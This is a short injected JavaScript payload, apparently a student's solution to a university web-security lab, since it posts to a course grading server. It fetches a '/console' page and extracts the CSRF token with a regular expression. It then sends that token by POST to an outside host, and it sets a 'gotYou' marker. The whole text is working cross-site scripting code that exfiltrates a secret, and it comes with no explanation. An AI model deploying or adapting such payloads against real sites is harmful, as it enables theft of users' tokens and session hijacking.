<script type="text/javascript">
window.gotYou = true;

fetch('/console')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.text(); // Get the response as text since it's HTML containing JavaScript
  })
  .then(html => {
    // Use string manipulation to extract the CSRF token from the submitSessionHijacking function
    const tokenPattern = /'X-CSRFToken': '([A-Za-z0-9+/=]+)'/;
    const matches = html.match(tokenPattern);
    const csrfToken = matches ? matches[1] : '';

    if (!csrfToken) {
      throw new Error('CSRF token not found');
    }

    // Now, send data to the specified endpoint with the CSRF token
    return fetch('https://cs6262.gtisc.gatech.edu/receive/gyadav35/699', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        // 'X-CSRFToken': csrfToken, // Use the extracted CSRF token
      },
      body: JSON.stringify({token: csrfToken}), // This can be adjusted as necessary
    });
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .catch(error => {
    console.error('Failed to chain fetch requests:', error);
  });
</script>